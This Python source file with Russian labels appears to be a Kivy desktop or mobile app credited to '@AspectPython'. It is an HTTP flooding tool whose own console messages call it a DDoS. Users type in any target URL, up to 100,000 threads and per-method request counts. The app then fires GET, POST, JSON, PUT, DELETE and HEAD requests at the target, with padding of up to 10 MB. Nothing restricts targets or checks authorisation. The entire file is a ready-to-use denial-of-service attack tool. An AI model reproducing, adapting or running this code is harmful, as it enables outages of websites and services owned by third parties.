import sys
import concurrent.futures
import requests
import time
import json
from threading import Lock
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.gridlayout import GridLayout
from kivy.core.window import Window
from kivy.clock import Clock
from kivy.properties import StringProperty, NumericProperty, BooleanProperty

request_lock = Lock()

class ConsoleLabel(Label):
    pass

class LimitedTextInput(TextInput):
    def __init__(self, max_value=999999, **kwargs):
        super().__init__(**kwargs)
        self.max_value = max_value
        self.input_filter = 'int'
        self.multiline = False

    def insert_text(self, substring, from_undo=False):
        if not substring.isdigit():
            return ''
        current = self.text
        new_text = current + substring
        if new_text and int(new_text) > self.max_value:
            return ''
        return super().insert_text(substring, from_undo)

class RequestApp(BoxLayout):
    total_requests = NumericProperty(0)
    get_requests = NumericProperty(0)
    post_requests = NumericProperty(0)
    post_json_requests = NumericProperty(0)
    put_requests = NumericProperty(0)
    delete_requests = NumericProperty(0)
    head_requests = NumericProperty(0)
    console_text = StringProperty("")
    is_running = BooleanProperty(False)

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = "vertical"
        self.padding = [10, 5]
        self.spacing = 5

        # Заголовок
        title_label = Label(
            text="Владелец @AspectPython",
            font_size=24,
            size_hint=(1, None),
            height=40,
            bold=True
        )
        self.add_widget(title_label)

        # Поля ввода
        input_scroll = ScrollView(size_hint=(1, 0.6))
        input_grid = GridLayout(
            cols=2,
            spacing=5,
            size_hint_y=None,
            padding=[0, 0, 5, 0]
        )
        input_grid.bind(minimum_height=input_grid.setter('height'))

        # Поля с новыми подписями
        fields = [
            ("URL:", "url_input", "https://example.com", None),
            ("Количество потоков:", "threads_input", "0", 100000),
            ("Запросов в потоке:", "requests_input", "0", 100000),
            ("Размер POST (байт):", "payload_size_input", "0", 10000000),
            ("GET запросов:", "get_requests_input", "0", 10000000),
            ("POST запросов:", "post_requests_input", "0", 10000000),
            ("JSON запросов:", "post_json_requests_input", "0", 10000000),
            ("PUT запросов:", "put_requests_input", "0", 10000000),
            ("DELETE запросов:", "delete_requests_input", "0", 10000000),
            ("HEAD запросов:", "head_requests_input", "0", 10000000),
        ]

        for text, name, default_value, max_value in fields:
            # Метки с новыми подписями
            label = Label(
                text=text,
                size_hint=(0.4, None),
                height=30,
                halign='left',
                valign='middle',
                padding=[5, 0]
            )
            label.bind(size=label.setter('text_size'))
            input_grid.add_widget(label)
            
            if max_value is not None:
                setattr(self, name, LimitedTextInput(
                    text=default_value,
                    size_hint=(0.6, None),
                    height=30,
                    max_value=max_value,
                    padding=[5, 0]
                ))
            else:
                setattr(self, name, TextInput(
                    text=default_value,
                    size_hint=(0.6, None),
                    height=30,
                    multiline=False,
                    padding=[5, 0]
                ))
            input_grid.add_widget(getattr(self, name))

        input_scroll.add_widget(input_grid)
        self.add_widget(input_scroll)

        # Кнопки
        button_box = BoxLayout(
            orientation="vertical",
            spacing=5,
            size_hint=(1, None),
            height=80
        )
        
        self.start_stop_button = Button(
            text="Запуск",
            size_hint=(1, None),
            height=35
        )
        self.start_stop_button.bind(on_press=self.toggle_start_stop)
        button_box.add_widget(self.start_stop_button)

        self.clear_button = Button(
            text="Очистить консоль",
            size_hint=(1, None),
            height=35
        )
        self.clear_button.bind(on_press=self.clear_console)
        button_box.add_widget(self.clear_button)

        self.add_widget(button_box)

        # Надпись "Консоль"
        self.add_widget(Label(
            text="Консоль:",
            size_hint=(1, None),
            height=25
        ))

        # Консоль (пустая по умолчанию)
        console_scroll = ScrollView(size_hint=(1, 0.3))
        self.console_label = ConsoleLabel(
            text="",
            size_hint_y=None,
            valign="top",
            halign="left",
            text_size=(Window.width - 20, None),
            padding=[10, 5],
            markup=True
        )
        self.console_label.bind(
            width=lambda *x: self.console_label.setter("text_size")(self.console_label, (self.console_label.width, None)),
            texture_size=lambda *x: self.console_label.setter("height")(self.console_label, self.console_label.texture_size[1])
        )
        console_scroll.add_widget(self.console_label)
        self.add_widget(console_scroll)

    def toggle_start_stop(self, instance):
        if not self.is_running:
            if self.validate_inputs():
                self.is_running = True
                self.start_stop_button.text = "Стоп"
                self.append_to_console("DDoS запущен!")
                Clock.schedule_once(lambda dt: self.run_requests(), 0.1)
            else:
                self.append_to_console("Ошибка: Проверьте ввод!")
        else:
            self.is_running = False
            self.start_stop_button.text = "Запуск"
            self.append_to_console("DDoS остановлен!")

    def validate_inputs(self):
        try:
            if (self.url_input.text.strip() and
                int(self.threads_input.text) > 0 and
                int(self.requests_input.text) > 0 and
                (int(self.get_requests_input.text) > 0 or
                 int(self.post_requests_input.text) > 0 or
                 int(self.post_json_requests_input.text) > 0 or
                 int(self.put_requests_input.text) > 0 or
                 int(self.delete_requests_input.text) > 0 or
                 int(self.head_requests_input.text) > 0)):
                return True
        except ValueError:
            pass
        return False

    def run_requests(self):
        if not self.is_running:
            return

        # Сброс счетчиков
        self.total_requests = 0
        self.get_requests = 0
        self.post_requests = 0
        self.post_json_requests = 0
        self.put_requests = 0
        self.delete_requests = 0
        self.head_requests = 0

        url = self.url_input.text
        num_threads = int(self.threads_input.text)
        requests_per_thread = int(self.requests_input.text)
        payload_size = int(self.payload_size_input.text)

        start_time = time.time()

        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(self.worker, url, requests_per_thread, payload_size) for _ in range(num_threads)]
            while self.is_running and not all(future.done() for future in futures):
                time.sleep(0.1)

        end_time = time.time()
        duration = end_time - start_time

        if self.is_running:
            self.append_to_console("\n--- Результаты ---")
            self.append_to_console(f"URL: {url}")
            self.append_to_console(f"Потоков: {num_threads}")
            self.append_to_console(f"Запросов в потоке: {requests_per_thread}")
            self.append_to_console(f"Всего запросов: {self.total_requests}")
            self.append_to_console(f"GET: {self.get_requests}")
            self.append_to_console(f"POST: {self.post_requests}")
            self.append_to_console(f"POST JSON: {self.post_json_requests}")
            self.append_to_console(f"PUT: {self.put_requests}")
            self.append_to_console(f"DELETE: {self.delete_requests}")
            self.append_to_console(f"HEAD: {self.head_requests}")
            self.append_to_console(f"Время: {duration:.2f} сек")
            self.append_to_console(f"RPS: {self.total_requests / duration:.2f}")
            self.is_running = False
            self.start_stop_button.text = "Запуск"

    def worker(self, url, requests_per_thread, payload_size):
        for _ in range(requests_per_thread):
            if not self.is_running:
                break
            self.send_all_requests(url, payload_size)

    def send_all_requests(self, url, payload_size):
        try:
            if int(self.get_requests_input.text) > 0:
                self.send_get_request(url)
            if int(self.post_requests_input.text) > 0:
                self.send_post_request(url, payload_size)
            if int(self.post_json_requests_input.text) > 0:
                self.send_post_json_request(url, payload_size)
            if int(self.put_requests_input.text) > 0:
                self.send_put_request(url, payload_size)
            if int(self.delete_requests_input.text) > 0:
                self.send_delete_request(url)
            if int(self.head_requests_input.text) > 0:
                self.send_head_request(url)
        except Exception as e:
            self.append_to_console(f"Ошибка: {str(e)}")

    def send_get_request(self, url):
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                with request_lock:
                    self.total_requests += 1
                    self.get_requests += 1
        except requests.exceptions.RequestException:
            pass

    def send_post_request(self, url, payload_size):
        try:
            payload = {'data': 'A' * payload_size}
            response = requests.post(url, data=payload, timeout=5)
            if response.status_code == 200:
                with request_lock:
                    self.total_requests += 1
                    self.post_requests += 1
        except requests.exceptions.RequestException:
            pass

    def send_post_json_request(self, url, payload_size):
        try:
            payload = {'data': 'A' * payload_size}
            json_payload = json.dumps(payload)
            headers = {'Content-Type': 'application/json'}
            response = requests.post(url, data=json_payload, headers=headers, timeout=5)
            if response.status_code == 200:
                with request_lock:
                    self.total_requests += 1
                    self.post_json_requests += 1
        except requests.exceptions.RequestException:
            pass

    def send_put_request(self, url, payload_size):
        try:
            payload = {'data': 'A' * payload_size}
            response = requests.put(url, data=payload, timeout=5)
            if response.status_code == 200:
                with request_lock:
                    self.total_requests += 1
                    self.put_requests += 1
        except requests.exceptions.RequestException:
            pass

    def send_delete_request(self, url):
        try:
            response = requests.delete(url, timeout=5)
            if response.status_code == 200:
                with request_lock:
                    self.total_requests += 1
                    self.delete_requests += 1
        except requests.exceptions.RequestException:
            pass

    def send_head_request(self, url):
        try:
            response = requests.head(url, timeout=5)
            if response.status_code == 200:
                with request_lock:
                    self.total_requests += 1
                    self.head_requests += 1
        except requests.exceptions.RequestException:
            pass

    def clear_console(self, instance):
        self.console_text = ""
        self.console_label.text = ""

    def append_to_console(self, text):
        self.console_text = f"{self.console_label.text}\n{text}" if self.console_label.text else text
        self.console_label.text = self.console_text
        self.console_label.parent.scroll_y = 0

class MyApp(App):
    def build(self):
        return RequestApp()

if __name__ == "__main__":
    MyApp().run()